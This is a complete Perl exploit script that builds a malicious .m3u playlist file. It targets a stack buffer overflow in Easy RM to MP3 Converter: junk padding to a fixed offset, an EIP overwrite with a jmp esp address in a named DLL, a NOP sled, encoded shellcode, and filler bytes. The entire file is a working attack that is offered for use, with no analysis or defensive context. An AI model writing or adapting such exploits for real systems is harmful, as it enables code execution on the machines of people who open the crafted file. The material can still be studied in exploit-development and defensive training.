#!/usr/bin/perl

my $buffsize = 50000; # sets buffer size for consistent sized payload

my $junk = "\x41" x 35039; # offset to eip overwrite
my $eip = pack('V', 0x01AAF23A); # jmp esp C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll
my $nops = "\x90" x 10000;

my $shell =
"\xbb\xd8\x2f\x2d\xcc\xdb\xc3\xd9\x74\x24\xf4\x58\x29\xc9" .
"\xb1\x53\x31\x58\x12\x03\x58\x12\x83\x18\x2b\xcf\x39\x64" .
"\xdc\x8d\xc2\x94\x1d\xf2\x4b\x71\x2c\x32\x2f\xf2\x1f\x82" .
"\x3b\x56\xac\x69\x69\x42\x27\x1f\xa6\x65\x80\xaa\x90\x48" .
"\x11\x86\xe1\xcb\x91\xd5\x35\x2b\xab\x15\x48\x2a\xec\x48" .
"\xa1\x7e\xa5\x07\x14\x6e\xc2\x52\xa5\x05\x98\x73\xad\xfa" .
"\x69\x75\x9c\xad\xe2\x2c\x3e\x4c\x26\x45\x77\x56\x2b\x60" .
"\xc1\xed\x9f\x1e\xd0\x27\xee\xdf\x7f\x06\xde\x2d\x81\x4f" .
"\xd9\xcd\xf4\xb9\x19\x73\x0f\x7e\x63\xaf\x9a\x64\xc3\x24" .
"\x3c\x40\xf5\xe9\xdb\x03\xf9\x46\xaf\x4b\x1e\x58\x7c\xe0" .
"\x1a\xd1\x83\x26\xab\xa1\xa7\xe2\xf7\x72\xc9\xb3\x5d\xd4" .
"\xf6\xa3\x3d\x89\x52\xa8\xd0\xde\xee\xf3\xbc\x13\xc3\x0b" .
"\x3d\x3c\x54\x78\x0f\xe3\xce\x16\x23\x6c\xc9\xe1\x44\x47" .
"\xad\x7d\xbb\x68\xce\x54\x78\x3c\x9e\xce\xa9\x3d\x75\x0e" .
"\x55\xe8\xe0\x06\xf0\x43\x17\xeb\x42\x34\x97\x43\x2b\x5e" .
"\x18\xbc\x4b\x61\xf2\xd5\xe4\x9c\xfd\xc8\xa8\x29\x1b\x80" .
"\x40\x7c\xb3\x3c\xa3\x5b\x0c\xdb\xdc\x89\x24\x4b\x94\xdb" .
"\xf3\x74\x25\xce\x53\xe2\xae\x1d\x60\x13\xb1\x0b\xc0\x44" .
"\x26\xc1\x81\x27\xd6\xd6\x8b\xdf\x7b\x44\x50\x1f\xf5\x75" .
"\xcf\x48\x52\x4b\x06\x1c\x4e\xf2\xb0\x02\x93\x62\xfa\x86" .
"\x48\x57\x05\x07\x1c\xe3\x21\x17\xd8\xec\x6d\x43\xb4\xba" .
"\x3b\x3d\x72\x15\x8a\x97\x2c\xca\x44\x7f\xa8\x20\x57\xf9" .
"\xb5\x6c\x21\xe5\x04\xd9\x74\x1a\xa8\x8d\x70\x63\xd4\x2d" .
"\x7e\xbe\x5c\x5d\x35\xe2\xf5\xf6\x90\x77\x44\x9b\x22\xa2" .
"\x8b\xa2\xa0\x46\x74\x51\xb8\x23\x71\x1d\x7e\xd8\x0b\x0e" .
"\xeb\xde\xb8\x2f\x3e";

my $sploit = $junk.$eip.$nops.$shell; # sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # filler for consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file
my $file = "asx2mp3.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
